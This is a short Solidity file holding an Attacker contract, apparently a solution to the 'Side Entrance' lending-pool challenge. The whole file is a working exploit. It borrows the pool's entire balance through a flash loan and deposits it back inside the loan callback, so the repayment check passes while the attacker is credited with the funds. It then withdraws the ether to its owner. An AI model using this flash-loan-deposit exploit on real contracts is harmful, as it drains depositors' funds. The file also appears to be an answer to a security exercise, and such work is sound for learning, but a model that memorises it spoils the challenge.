import {SideEntranceLenderPool, IFlashLoanEtherReceiver} from "./SideEntranceLenderPool.sol";

contract Attacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool public immutable victim;
    address public immutable owner;

    constructor(address _victim) {
        victim = SideEntranceLenderPool(_victim);
        owner = msg.sender;
    }

    function attack() external {
        victim.flashLoan(address(victim).balance);
        victim.withdraw();
        (bool success,) = owner.call{value: address(this).balance}("");
        require(success, "Call failed");
    }

    function execute() external payable {
        victim.deposit{value: msg.value}();
    }

    receive() external payable {}
}
